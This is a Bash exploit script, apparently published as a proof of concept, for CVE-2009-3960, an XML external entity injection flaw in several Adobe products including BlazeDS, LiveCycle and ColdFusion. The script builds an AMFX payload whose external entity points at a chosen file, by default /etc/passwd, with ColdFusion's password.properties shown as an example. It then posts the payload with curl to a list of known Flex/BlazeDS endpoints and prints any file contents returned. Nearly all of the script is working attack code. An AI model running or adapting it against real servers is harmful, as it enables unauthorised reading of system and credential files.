#!/bin/bash
#
# Exploit Title: Adobe XML Injection file content disclosure
# Date: 07-04-2017
# Exploit Author: Thomas Sluyter
# Website: https://www.kilala.nl
# Vendor Homepage: http://www.adobe.com/support/security/bulletins/apsb10-05.html
# Version: Multiple Adobe products
# Tested on: Windows Server 2003, ColdFusion 8.0 Enterprise
# CVE : 2009-3960
#
# Shell script that let's you exploit a known XML injection vulnerability
# in a number of Adobe products, allowing you to read files that are otherwise
# inaccessible. In Metasploit, this is achieved with auxiliary:scanner:adobe_xml_inject
# This script is a Bash implementation of the PoC multiple/dos/11529.txt.
#
# According to the original Metasploit code, this attack works with:
# 	"Multiple Adobe Products: BlazeDS 3.2 and earlier versions, 
# 	 LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1,
#	 and 2.5.1, Flex Data Services 2.0.1, ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2"
#


PROGNAME="$(basename $0)"                       # This script
TIMESTAMP=$(date +%y%m%d%H%M)                   # Used for scratchfiles
SCRATCHFILE="/tmp/${PROGNAME}.${TIMESTAMP}"     # Used as generic scratchfile
EXITCODE="0"					# Assume success, changes on errors
CURL="/usr/bin/curl"				# Other locations are detected with "which"

SSL="0"						# Overridden by -s
DEBUG="0"					# Overridden by -d
BREAKFOUND="0"					# Overridden by -b
TARGETHOST=""					# Overridden by -h
TARGETPORT="8400"				# Overridden by -p
READFILE="/etc/passwd"				# Overridden by -f


################################## OVERHEAD SECTION 
# 
# Various functions for overhead purposes.
#

# Defining our own logger function, so we can switch between stdout and syslog.
logger() {
        LEVEL="$1"
        MESSAGE="$2"

	# You may switch the following two, if you need to log to syslog.
        #[[ ${DEBUG} -gt 0 ]] && echo "${LEVEL} $MESSAGE" || /usr/bin/logger -p ${LEVEL} "$MESSAGE"
        [[ ${DEBUG} -gt 0 ]] && echo "${LEVEL} $MESSAGE" || echo "${LEVEL} $MESSAGE"
}


ExitCleanup() {
	EXITCODE=${1} 
	rm -f ${SCRATCHFILE}* >/dev/null 2>&1
	echo ""
	exit ${EXITCODE}
}


# Many thanks to http://www.linuxjournal.com/content/validating-ip-address-bash-script
ValidIP() {
    local IP=${1}
    local STAT=1

    if [[ ${IP} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    then
        OIFS=$IFS; IFS='.'
        IP=(${IP})
        IFS=$OIFS
        [[ (${IP[0]} -le 255) && (${IP[1]} -le 255) && (${IP[2]} -le 255) && (${IP[3]} -le 255) ]]
        stat=$?
    fi
    return $stat
}


# Function to output help information.
show-help() {
        echo ""
        cat << EOF
        ${PROGNAME} [-?] [-d] [-s] [-b] -h host [-p port] [-f file]

	   -?   Show this help message.
	   -d   Debug mode, outputs more kruft on stdout.
	   -s   Use SSL / HTTPS, instead of HTTP.
	   -b	Break on the first valid answer found.
	   -h	Target host
	   -p	Target port, defaults to 8400.
	   -f	Full path to file to grab, defaults to /etc/passwd.

	This script exploits a known vulnerability in a set of Adobe applications. Using one 
	of a few possible URLs on the target host (-h) we attempt to read a file (-f) that is
	normally inaccessible. 

	NOTE: Windows paths use \\, so be sure to properly escape them when using -f! For example:
	${PROGNAME} -h 192.168.1.20 -f c:\\\\coldfusion8\\\\lib\\\\password.properties
	${PROGNAME} -h 192.168.1.20 -f 'c:\\coldfusion8\\lib\\password.properties'

	This script relies on CURL, so please have it in your PATH. 

EOF
}


# Parsing and verifying the passed parameters.
OPTIND=1        
while getopts "?dsbh:p:f:" opt; do
    case "$opt" in
    \?) show-help; ExitCleanup 0 ;;
     d) DEBUG="1" ;;
     s) SSL="1" ;;
     b) BREAKFOUND="1" ;;
     h) [[ -z ${OPTARG} ]] && (show-help; ExitCleanup 1)
	ValidIP ${OPTARG}; if [[ $? -eq 0 ]]
	then TARGETHOST=${OPTARG}
	else TARGETHOST=$(nslookup ${OPTARG} | grep ^Name | awk '{print $2}')
	     [[ $? -gt 0 ]] && (logger ERROR "Target host ${TARGETHOST} not found in DNS."; ExitCleanup 1)
	fi ;;
     p) [[ -z ${OPTARG} ]] && (show-help; ExitCleanup 1)
	if [[ ! -z $(echo ${OPTARG} | tr -d '[:alnum:]') ]]
	then logger ERROR "Target port ${OPTARG} is incorrect."; ExitCleanup 1
	else TARGETPORT=${OPTARG}
	fi ;;
     f) [[ -z ${OPTARG} ]] && (show-help; ExitCleanup 1)
	if [[ (-z $(echo ${OPTARG} | grep ^\/)) && (-z $(echo ${OPTARG} | grep ^[a-Z]:)) ]]
	then logger ERROR "File is NOT specified with full Unix or Windows path."; ExitCleanup 1
	else READFILE=${OPTARG}
	fi ;;
     *) show-help; ExitCleanup 0 ;;
    esac
done

[[ $(which curl) ]] && CURL=$(which curl) || (logger ERROR "CURL was not found."; ExitCleanup 1)
[[ -z ${TARGETHOST} ]] && (logger ERROR "Target host was not set."; ExitCleanup 1)

[[ ${DEBUG} -gt 0 ]] && logger DEBUG "Proceeding with host/port/file: ${TARGETHOST},${TARGETPORT},${READFILE}."


################################## GETTING TO WORK
# 
#

PATHLIST=("/flex2gateway/" "/flex2gateway/http" "/flex2gateway/httpsecure" \
          "/flex2gateway/cfamfpolling" "/flex2gateway/amf" "/flex2gateway/amfpolling" \
          "/messagebroker/http" "/messagebroker/httpsecure" "/blazeds/messagebroker/http" \
          "/blazeds/messagebroker/httpsecure" "/samples/messagebroker/http" \
          "/samples/messagebroker/httpsecure" "/lcds/messagebroker/http" \
          "/lcds/messagebroker/httpsecure" "/lcds-samples/messagebroker/http" \
          "/lcds-samples/messagebroker/httpsecure")

echo "<?xml version=\"1.0\" encoding=\"utf-8\"?>" > ${SCRATCHFILE}
echo "<!DOCTYPE test [ <!ENTITY x3 SYSTEM \"${READFILE}\"> ]>" >> ${SCRATCHFILE}
echo "<amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\">" >> ${SCRATCHFILE}
echo "<body><object type=\"flex.messaging.messages.CommandMessage\"><traits>" >> ${SCRATCHFILE}
echo "<string>body</string><string>clientId</string><string>correlationId</string><string>destination</string>" >> ${SCRATCHFILE}
echo "<string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string>" >> ${SCRATCHFILE}
echo "<string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object>" >> ${SCRATCHFILE}
echo "<traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string>" >> ${SCRATCHFILE}
echo "<int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>" >> ${SCRATCHFILE}

if [[ ${DEBUG} -gt 0 ]] 
then
   logger DEBUG "XML file sent to target host reads as follows:"
   echo "======================================"
   cat ${SCRATCHFILE}
   echo "======================================"
   echo ""
fi

let CONTENTLENGTH=$(wc -c ${SCRATCHFILE} | awk '{print $1}')-1

for ADOBEPATH in "${PATHLIST[@]}"
do
   [[ ${SSL} -gt 0 ]] && PROTOCOL="https" || PROTOCOL="http"
   URI="${PROTOCOL}://${TARGETHOST}:${TARGETPORT}${ADOBEPATH}"

   [[ ${DEBUG} -gt 0 ]] && logger DEBUG "Proceeding with URI: ${URI}"

   # Header contents based on a tcpdump capture of original exploit being
   # run from Metasploit.
   HEADER="-H \"Host: ${TARGETHOST}\" -H \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"Content-Length: ${CONTENTLENGTH}\""

   CURLPOST="${CURL} -X POST -k -s --http1.1 ${HEADER} -w \"%{http_code}\" -d @- ${URI}"

   [[ ${DEBUG} -gt 0 ]] && logger DEBUG "Using this CURL command: ${CURLPOST}"

   # The tr command dikes out any non-ASCII characters which might mess with output.
   CURLOUTPUT=$(cat ${SCRATCHFILE} | ${CURLPOST} | tr -cd '\11\12\15\40-\176' 2>&1)

   # Output is pretty garbled and the HTTP return code is enclosed in double quotes.
   # I need to grab the last 5 chars (includes NULL EOF) and remove the ".
   CURLCODE=$(echo ${CURLOUTPUT} | tail -c5 | tr -cd [:digit:])

   if [[ ${DEBUG} -gt 0 ]] 
   then
	logger DEBUG "CURL was given this HTTP return code: ${CURLCODE}."
	logger DEBUG "Output from CURL reads as follows:"
        echo "======================================"
	echo "${CURLOUTPUT}"
        echo "======================================"
	echo ""
   fi

   logger INFO "${CURLCODE} for ${URI}"

   if [[ (${CURLCODE} -eq 200) && (! -z $(echo ${CURLOUTPUT} | grep "<?xml version=")) ]] 
   then 
	echo "Read from ${URI}:"
	echo "${CURLOUTPUT}" | sed 's/^[^<]*</</'
	[[ ${BREAKFOUND} -gt 0 ]] && ExitCleanup 0
   fi

   if [[ ${DEBUG} -gt 0 ]] 
   then 
	echo -e "\nReady to continue with the next URI? [y/n]: \c"
       	read READY
	case ${READY} in
	   y|Y|yes) logger DEBUG "Moving to next URI."; echo "" ;;
	   *) logger DEBUG "Aborting..."; ExitCleanup 1 ;;
	esac
   fi
done


ExitCleanup 0